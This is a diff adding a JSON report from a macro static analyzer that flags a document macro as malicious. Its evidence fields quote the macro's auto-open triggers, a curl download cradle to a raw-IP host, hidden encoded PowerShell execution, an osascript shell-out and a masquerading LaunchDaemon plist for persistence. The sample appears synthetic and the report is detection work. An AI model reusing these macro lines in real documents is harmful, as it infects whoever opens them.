@@ -1,0 +1,161 @@
+{
+  "tool": "GraySentinel Macro Static Analyzer",
+  "version": "1.0.0",
+  "generated_utc": "2026-09-16T03:30:02Z",
+  "source_file": "data/invoice_Q3.docm.extracted.bas",
+  "lines_scanned": 34,
+  "counts": {
+    "CRITICAL": 3,
+    "HIGH": 7,
+    "MEDIUM": 5,
+    "LOW": 1
+  },
+  "total_findings": 16,
+  "verdict": "MALICIOUS",
+  "findings": [
+    {
+      "rule_id": "MSA-04",
+      "severity": "CRITICAL",
+      "attck": "T1105",
+      "title": "Remote download cradle",
+      "line": 22,
+      "evidence": "' [olevba deobfuscated] Shell \"curl -s http://198.51.100.44/assets/update.bin -o /tmp/.u\"",
+      "why": "Fetches a second-stage payload from a remote host."
+    },
+    {
+      "rule_id": "MSA-02",
+      "severity": "CRITICAL",
+      "attck": "T1059.001",
+      "title": "PowerShell encoded-command execution",
+      "line": 24,
+      "evidence": "CreateObject(\"WScript.Shell\").Run \"powershell -w hidden -enc \" & stager, 0, False",
+      "why": "Hidden/encoded PowerShell is a classic in-memory execution cradle."
+    },
+    {
+      "rule_id": "MSA-07",
+      "severity": "CRITICAL",
+      "attck": "T1543.001",
+      "title": "macOS LaunchDaemon/Agent persistence",
+      "line": 31,
+      "evidence": "plist = \"/Library/LaunchDaemons/com.apple.softwareupdated.helper.plist\"",
+      "why": "Writes a plist to survive reboot \u2014 persistence."
+    },
+    {
+      "rule_id": "MSA-01",
+      "severity": "HIGH",
+      "attck": "T1137.001",
+      "title": "Auto-execution trigger (AutoOpen/Document_Open)",
+      "line": 12,
+      "evidence": "Sub AutoOpen()",
+      "why": "Macro runs the moment the document opens \u2014 no user click needed."
+    },
+    {
+      "rule_id": "MSA-01",
+      "severity": "HIGH",
+      "attck": "T1137.001",
+      "title": "Auto-execution trigger (AutoOpen/Document_Open)",
+      "line": 13,
+      "evidence": "Document_Open",
+      "why": "Macro runs the moment the document opens \u2014 no user click needed."
+    },
+    {
+      "rule_id": "MSA-01",
+      "severity": "HIGH",
+      "attck": "T1137.001",
+      "title": "Auto-execution trigger (AutoOpen/Document_Open)",
+      "line": 16,
+      "evidence": "Sub Document_Open()",
+      "why": "Macro runs the moment the document opens \u2014 no user click needed."
+    },
+    {
+      "rule_id": "MSA-05",
+      "severity": "HIGH",
+      "attck": "T1059.005",
+      "title": "Living-off-VBA runner (Shell/WScript.Shell)",
+      "line": 22,
+      "evidence": "' [olevba deobfuscated] Shell \"curl -s http://198.51.100.44/assets/update.bin -o /tmp/.u\"",
+      "why": "Spawns arbitrary processes from inside the macro."
+    },
+    {
+      "rule_id": "MSA-03",
+      "severity": "HIGH",
+      "attck": "T1059.002",
+      "title": "AppleScript / osascript shell-out (macOS)",
+      "line": 23,
+      "evidence": "Shell \"osascript -e 'do shell script \" & Chr(34) & \"curl -s \" & payloadUrl & \" -o /tmp/.u\" & Chr(34) & \"'\", vbHide",
+      "why": "VBA pivoting to osascript to run macOS shell commands."
+    },
+    {
+      "rule_id": "MSA-05",
+      "severity": "HIGH",
+      "attck": "T1059.005",
+      "title": "Living-off-VBA runner (Shell/WScript.Shell)",
+      "line": 23,
+      "evidence": "Shell \"osascript -e 'do shell script \" & Chr(34) & \"curl -s \" & payloadUrl & \" -o /tmp/.u\" & Chr(34) & \"'\", vbHide",
+      "why": "Spawns arbitrary processes from inside the macro."
+    },
+    {
+      "rule_id": "MSA-05",
+      "severity": "HIGH",
+      "attck": "T1059.005",
+      "title": "Living-off-VBA runner (Shell/WScript.Shell)",
+      "line": 24,
+      "evidence": "CreateObject(\"WScript.Shell\").Run \"powershell -w hidden -enc \" & stager, 0, False",
+      "why": "Spawns arbitrary processes from inside the macro."
+    },
+    {
+      "rule_id": "MSA-09",
+      "severity": "MEDIUM",
+      "attck": "T1071.001",
+      "title": "Hard-coded C2 / beacon endpoint",
+      "line": 20,
+      "evidence": "payloadUrl = \"http://198.51.100.44/assets/update.bin\"",
+      "why": "Raw IP URL with a path \u2014 beacon/gate to an operator server."
+    },
+    {
+      "rule_id": "MSA-06",
+      "severity": "MEDIUM",
+      "attck": "T1140",
+      "title": "Base64 / obfuscated blob",
+      "line": 21,
+      "evidence": "stager = \"cHJpbnQoJ1NZTlRIRVRJQyBTVEFHRVIgLSBOTyBQQVlMT0FEJyk=\"",
+      "why": "Long base64 literal \u2014 commonly a packed command or payload."
+    },
+    {
+      "rule_id": "MSA-09",
+      "severity": "MEDIUM",
+      "attck": "T1071.001",
+      "title": "Hard-coded C2 / beacon endpoint",
+      "line": 22,
+      "evidence": "' [olevba deobfuscated] Shell \"curl -s http://198.51.100.44/assets/update.bin -o /tmp/.u\"",
+      "why": "Raw IP URL with a path \u2014 beacon/gate to an operator server."
+    },
+    {
+      "rule_id": "MSA-08",
+      "severity": "MEDIUM",
+      "attck": "T1036.005",
+      "title": "Apple-service masquerade name",
+      "line": 31,
+      "evidence": "plist = \"/Library/LaunchDaemons/com.apple.softwareupdated.helper.plist\"",
+      "why": "Names itself after a legit Apple service to blend in."
+    },
+    {
+      "rule_id": "MSA-09",
+      "severity": "MEDIUM",
+      "attck": "T1071.001",
+      "title": "Hard-coded C2 / beacon endpoint",
+      "line": 33,
+      "evidence": "Debug.Print \"would_beacon:http://203.0.113.9:8443/gate\"",
+      "why": "Raw IP URL with a path \u2014 beacon/gate to an operator server."
+    },
+    {
+      "rule_id": "MSA-10",
+      "severity": "LOW",
+      "attck": "T1564.003",
+      "title": "Hidden-window execution flag",
+      "line": 23,
+      "evidence": "Shell \"osascript -e 'do shell script \" & Chr(34) & \"curl -s \" & payloadUrl & \" -o /tmp/.u\" & Chr(34) & \"'\", vbHide",
+      "why": "Runs children with no visible window to avoid the user noticing."
+    }
+  ]
+}
